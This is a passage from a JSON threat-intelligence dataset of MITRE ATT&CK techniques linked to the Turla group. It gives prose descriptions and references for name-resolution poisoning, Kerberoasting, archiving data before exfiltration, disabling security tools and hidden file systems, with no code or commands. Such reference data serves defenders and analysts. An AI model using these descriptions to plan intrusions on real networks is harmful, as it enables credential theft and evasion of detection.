LLMNR Spoofer) (Citation: GitHub Responder)",
    "technique_references": [
      {
        "source_name": "Wikipedia LLMNR",
        "url": "https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution",
        "description": "Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet NetBIOS",
        "url": "https://technet.microsoft.com/library/cc958811.aspx",
        "description": "Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "byt3bl33d3r NTLM Relaying",
        "url": "https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",
        "description": "Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secure Ideas SMB Relay",
        "url": "https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",
        "description": "Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub NBNSpoof",
        "url": "https://github.com/nomex/nbnspoof",
        "description": "Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 LLMNR Spoofer",
        "url": "https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response",
        "description": "Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Responder",
        "url": "https://github.com/SpiderLabs/Responder",
        "description": "Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sternsecurity LLMNR-NBTNS",
        "url": "https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning",
        "description": "Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Conveigh",
        "url": "https://github.com/Kevin-Robertson/Conveigh",
        "description": "Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--650c784b-7504-4df7-ab2c-4ea882384d1e",
    "platform": "windows",
    "tid": "T1557.001",
    "technique": "LLMNR/NBT-NS Poisoning and SMB Relay",
    "tactic": "credential-access",
    "datasources": "network-traffic-content|network-traffic-flow|service-creation|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \n\nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR) (Citation: TechNet NetBIOS)\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. (Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay)\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174). (Citation: GitHub NBNSpoof) (Citation: Rapid7 LLMNR Spoofer) (Citation: GitHub Responder)",
    "technique_references": [
      {
        "source_name": "Wikipedia LLMNR",
        "url": "https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution",
        "description": "Wikipedia. (2016, July 7). Link-Local Multicast Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "TechNet NetBIOS",
        "url": "https://technet.microsoft.com/library/cc958811.aspx",
        "description": "Microsoft. (n.d.). NetBIOS Name Resolution. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "byt3bl33d3r NTLM Relaying",
        "url": "https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html",
        "description": "Salvati, M. (2017, June 2). Practical guide to NTLM Relaying in 2017 (A.K.A getting a foothold in under 5 minutes). Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "Secure Ideas SMB Relay",
        "url": "https://blog.secureideas.com/2018/04/ever-run-a-relay-why-smb-relays-should-be-on-your-mind.html",
        "description": "Kuehn, E. (2018, April 11). Ever Run a Relay? Why SMB Relays Should Be On Your Mind. Retrieved February 7, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub NBNSpoof",
        "url": "https://github.com/nomex/nbnspoof",
        "description": "Nomex. (2014, February 7). NBNSpoof. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Rapid7 LLMNR Spoofer",
        "url": "https://www.rapid7.com/db/modules/auxiliary/spoof/llmnr/llmnr_response",
        "description": "Francois, R. (n.d.). LLMNR Spoofer. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Responder",
        "url": "https://github.com/SpiderLabs/Responder",
        "description": "Gaffie, L. (2016, August 25). Responder. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "Sternsecurity LLMNR-NBTNS",
        "url": "https://www.sternsecurity.com/blog/local-network-attacks-llmnr-and-nbt-ns-poisoning",
        "description": "Sternstein, J. (2013, November). Local Network Attacks: LLMNR and NBT-NS Poisoning. Retrieved November 17, 2017.",
        "external_id": "none"
      },
      {
        "source_name": "GitHub Conveigh",
        "url": "https://github.com/Kevin-Robertson/Conveigh",
        "description": "Robertson, K. (2016, August 28). Conveigh. Retrieved November 17, 2017.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f2877f7f-9a4c-4251-879f-1224e3006bee",
    "platform": "windows",
    "tid": "T1558.003",
    "technique": "Kerberoasting",
    "tactic": "credential-access",
    "datasources": "active-directory-credential-request",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to [Brute Force](https://attack.mitre.org/techniques/T1110).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service(Citation: Microsoft Detecting Kerberoasting Feb 2018)).(Citation: Microsoft SPN)(Citation: Microsoft SetSPN)(Citation: SANS Attacking Kerberos Nov 2014)(Citation: Harmj0y Kerberoast Nov 2016)\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC).(Citation: Empire InvokeKerberoast Oct 2016)(Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials.(Citation: AdSecurity Cracking Kerberos Dec 2015)(Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)\n\nThis same behavior could be executed using service tickets captured from network traffic.(Citation: AdSecurity Cracking Kerberos Dec 2015)\n\nCracked hashes may enable [Persistence](https://attack.mitre.org/tactics/TA0003), [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), and [Lateral Movement](https://attack.mitre.org/tactics/TA0008) via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: SANS Attacking Kerberos Nov 2014)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/509.html",
        "description": "none",
        "external_id": "CAPEC-509"
      },
      {
        "source_name": "Empire InvokeKerberoast Oct 2016",
        "url": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1",
        "description": "EmpireProject. (2016, October 31). Invoke-Kerberoast.ps1. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "AdSecurity Cracking Kerberos Dec 2015",
        "url": "https://adsecurity.org/?p=2293",
        "description": "Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets Using Kerberoast – Exploiting Kerberos to Compromise the Active Directory Domain. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft Detecting Kerberoasting Feb 2018",
        "url": "https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/",
        "description": "Bani, M. (2018, February 23). Detecting Kerberoasting activity using Azure Security Center. Retrieved March 23, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SPN",
        "url": "https://msdn.microsoft.com/library/ms677949.aspx",
        "description": "Microsoft. (n.d.). Service Principal Names. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft SetSPN",
        "url": "https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx",
        "description": "Microsoft. (2010, April 13). Service Principal Names (SPNs) SetSPN Syntax (Setspn.exe). Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "SANS Attacking Kerberos Nov 2014",
        "url": "https://redsiege.com/kerberoast-slides",
        "description": "Medin, T. (2014, November). Attacking Kerberos - Kicking the Guard Dog of Hades. Retrieved March 22, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Harmj0y Kerberoast Nov 2016",
        "url": "https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/",
        "description": "Schroeder, W. (2016, November 1). Kerberoasting Without Mimikatz. Retrieved March 23, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--acd0ba37-7ba9-4cc5-ac61-796586cd856d",
    "platform": "windows|macos|linux",
    "tid": "T1559",
    "technique": "Inter-Process Communication",
    "tactic": "execution",
    "datasources": "module-load|process-access|process-creation|script-execution",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1559.001",
      "T1559.002"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "turla",
    "correlation_malware": "hyperstack",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. IPC is typically used by processes to share data, communicate with each other, or synchronize execution. IPC is also commonly used to avoid situations such as deadlocks, which occurs when processes are stuck in a cyclic waiting pattern. \n\nAdversaries may abuse IPC to execute arbitrary code or commands. IPC mechanisms may differ depending on OS, but typically exists in a form accessible through programming languages/libraries or native interfaces such as Windows [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002) or [Component Object Model](https://attack.mitre.org/techniques/T1559/001). Linux environments support several different IPC mechanisms, two of which being sockets and pipes.(Citation: Linux IPC) Higher level execution mediums, such as those of [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s, may also leverage underlying IPC mechanisms. Adversaries may also use [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) to facilitate remote IPC execution.(Citation: Fireeye Hunting COM June 2019)",
    "technique_references": [
      {
        "source_name": "Linux IPC",
        "url": "https://www.geeksforgeeks.org/inter-process-communication-ipc/#:~:text=Inter%2Dprocess%20communication%20(IPC),of%20co%2Doperation%20between%20them.",
        "description": "N/A. (2021, April 1). Inter Process Communication (IPC). Retrieved March 11, 2022.",
        "external_id": "none"
      },
      {
        "source_name": "Fireeye Hunting COM June 2019",
        "url": "https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html",
        "description": "Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June 10, 2019.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "administrator|user|system",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a",
    "platform": "linux|macos|windows",
    "tid": "T1560",
    "technique": "Archive Collected Data",
    "tactic": "collection",
    "datasources": "command-execution|file-creation|process-creation|script-execution",
    "has_subtechniques": true,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [
      "T1560.002",
      "T1560.003"
    ],
    "count_subtechniques": 2,
    "correlation_adversary": "turla",
    "correlation_malware": "epic|lightneuron",
    "correlation_tool": "empire",
    "correlation_gid": "G0010",
    "technique_description": "An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.\n\nBoth compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",
    "technique_references": [
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662",
    "platform": "linux|macos|windows",
    "tid": "T1560.001",
    "technique": "Archive via Utility",
    "tactic": "collection",
    "datasources": "command-execution|file-creation|process-creation",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "crutch",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.\n\nAdversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) Additionally, <code>xcopy</code> on Windows can copy files and directories with a variety of options.\n\nAdversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",
    "technique_references": [
      {
        "source_name": "WinRAR Homepage",
        "url": "https://www.rarlab.com/",
        "description": "A. Roshal. (2020). RARLAB. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "WinZip Homepage",
        "url": "https://www.winzip.com/win/en/",
        "description": "Corel Corporation. (2020). WinZip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "7zip Homepage",
        "url": "https://www.7-zip.org/",
        "description": "I. Pavlov. (2019). 7-Zip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "diantz.exe_lolbas",
        "url": "https://lolbas-project.github.io/lolbas/Binaries/Diantz/",
        "description": "Living Off The Land Binaries, Scripts and Libraries (LOLBAS). (n.d.). Diantz.exe. Retrieved October 25, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6",
    "platform": "linux|macos|windows",
    "tid": "T1560.002",
    "technique": "Archive via Library",
    "tactic": "collection",
    "datasources": "file-creation|script-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "epic",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data.\n\nSome archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",
    "technique_references": [
      {
        "source_name": "PyPI RAR",
        "url": "https://pypi.org/project/rarfile/",
        "description": "mkz. (2020). rarfile 3.1. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "libzip",
        "url": "https://libzip.org/",
        "description": "D. Baron, T. Klausner. (2020). libzip. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Zlib Github",
        "url": "https://github.com/madler/zlib",
        "description": "madler. (2017). zlib. Retrieved February 20, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Wikipedia File Header Signatures",
        "url": "https://en.wikipedia.org/wiki/List_of_file_signatures",
        "description": "Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
    "platform": "windows|macos|linux|containers|iaas",
    "tid": "T1562.001",
    "technique": "Disable or Modify Tools",
    "tactic": "defense-evasion",
    "datasources": "command-execution|host-status|process-termination|service-metadata|windows-registry-key-deletion|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "none",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take the many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls)",
    "technique_references": [
      {
        "source_name": "capec",
        "url": "https://capec.mitre.org/data/definitions/578.html",
        "description": "none",
        "external_id": "CAPEC-578"
      },
      {
        "source_name": "OutFlank System Calls",
        "url": "https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/",
        "description": "de Plaa, C. (2019, June 19). Red Team Tactics: Combining Direct System Calls and sRDI to bypass AV/EDR. Retrieved September 29, 2021.",
        "external_id": "none"
      },
      {
        "source_name": "MDSec System Calls",
        "url": "https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/",
        "description": "MDSec Research. (2020, December). Bypassing User-Mode Hooks and Direct Invocation of System Calls for Red Teams. Retrieved September 29, 2021.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--f2857333-11d4-45bf-b064-2c28d8525be5",
    "platform": "windows",
    "tid": "T1564.004",
    "technique": "NTFS File Attributes",
    "tactic": "defense-evasion",
    "datasources": "command-execution|file-metadata|file-modification|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "gazer",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)\n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)",
    "technique_references": [
      {
        "source_name": "SpectorOps Host-Based Jul 2017",
        "url": "https://posts.specterops.io/host-based-threat-modeling-indicator-design-a9dbbb53d5ea",
        "description": "Atkinson, J. (2017, July 18). Host-based Threat Modeling & Indicator Design. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft NTFS File Attributes Aug 2010",
        "url": "https://blogs.technet.microsoft.com/askcore/2010/08/25/ntfs-file-attributes/",
        "description": "Hughes, J. (2010, August 25). NTFS File Attributes. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft File Streams",
        "url": "http://msdn.microsoft.com/en-us/library/aa364404",
        "description": "Microsoft. (n.d.). File Streams. Retrieved December 2, 2014.",
        "external_id": "none"
      },
      {
        "source_name": "MalwareBytes ADS July 2015",
        "url": "https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/",
        "description": "Arntz, P. (2015, July 22). Introduction to Alternate Data Streams. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Microsoft ADS Mar 2014",
        "url": "https://blogs.technet.microsoft.com/askcore/2013/03/24/alternate-data-streams-in-ntfs/",
        "description": "Marlin, J. (2013, March 24). Alternate Data Streams in NTFS. Retrieved March 21, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Journey into IR ZeroAccess NTFS EA",
        "url": "http://journeyintoir.blogspot.com/2012/12/extracting-zeroaccess-from-ntfs.html",
        "description": "Harrell, C. (2012, December 11). Extracting ZeroAccess from NTFS Extended Attributes. Retrieved June 3, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe ADS1 Jan 2018",
        "url": "https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/",
        "description": "Moe, O. (2018, January 14). Putting Data in Alternate Data Streams and How to Execute It. Retrieved June 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Oddvar Moe ADS2 Apr 2018",
        "url": "https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/",
        "description": "Moe, O. (2018, April 11). Putting Data in Alternate Data Streams and How to Execute It - Part 2. Retrieved June 30, 2018.",
        "external_id": "none"
      },
      {
        "source_name": "Symantec ADS May 2009",
        "url": "https://www.symantec.com/connect/articles/what-you-need-know-about-alternate-data-streams-windows-your-data-secure-can-you-restore",
        "description": "Pravs. (2009, May 25). What you need to know about alternate data streams in windows? Is your Data secure? Can you restore that?. Retrieved March 21, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04",
    "platform": "linux|macos|windows",
    "tid": "T1564.005",
    "technique": "Hidden File System",
    "tactic": "defense-evasion",
    "datasources": "file-modification|firmware-modification|windows-registry-key-modification",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "comrat",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)",
    "technique_references": [
      {
        "source_name": "MalwareTech VFS Nov 2014",
        "url": "https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html",
        "description": "Hutchins, M. (2014, November 28). Virtual File Systems for Beginners. Retrieved June 22, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye Bootkits",
        "url": "https://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html",
        "description": "Andonov, D., et al. (2015, December 7). Thriving Beyond The Operating System: Financial Threat Group Targets Volume Boot Record. Retrieved May 13, 2016.",
        "external_id": "none"
      },
      {
        "source_name": "ESET ComRAT May 2020",
        "url": "https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf",
        "description": "Faou, M. (2020, May). From Agent.btz to ComRAT v4: A ten-year journey. Retrieved June 15, 2020.",
        "external_id": "none"
      },
      {
        "source_name": "Kaspersky Equation QA",
        "url": "https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf",
        "description": "Kaspersky Lab's Global Research and Analysis Team. (2015, February). Equation Group: Questions and Answers. Retrieved December 21, 2015.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "user|administrator",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--d0613359-5781-4fd2-b5be-c269270be1f6",
    "platform": "linux|macos|windows",
    "tid": "T1565.002",
    "technique": "Transmitted Data Manipulation",
    "tactic": "impact",
    "datasources": "network-traffic-content|network-traffic-flow|os-api-execution",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
    "correlation_adversary": "turla",
    "correlation_malware": "lightneuron",
    "correlation_tool": "none",
    "correlation_gid": "G0010",
    "technique_description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "technique_references": [
      {
        "source_name": "DOJ Lazarus Sony 2018",
        "url": "https://www.justice.gov/opa/press-release/file/1092091/download",
        "description": "Department of Justice. (2018, September 6). Criminal Complaint - United States of America v. PARK JIN HYOK. Retrieved March 29, 2019.",
        "external_id": "none"
      },
      {
        "source_name": "FireEye APT38 Oct 2018",
        "url": "https://content.fireeye.com/apt/rpt-apt38",
        "description": "FireEye. (2018, October 03). APT38: Un-usual Suspects. Retrieved November 6, 2018.",
        "external_id": "none"
      }
    ],
    "technique_required_permissions": "none",
    "technique_effective_permissions": "none",
    "search_token": "none"
  },
  {
    "id": "attack-pattern--2b742742-28c3-4e1b-bab7-8350d6300fa7",
    "platform": "linux|macos|windows|office-365|saas|google-workspace",
    "tid": "T1566.002",
    "technique": "Spearphishing Link",
    "tactic": "initial-access",
    "datasources": "application-log-content|network-traffic-content|network-traffic-flow",
    "has_subtechniques": false,
    "is_deprecated": false,
    "is_revoked": false,
    "subtechniques": [],
    "count_subtechniques": 0,
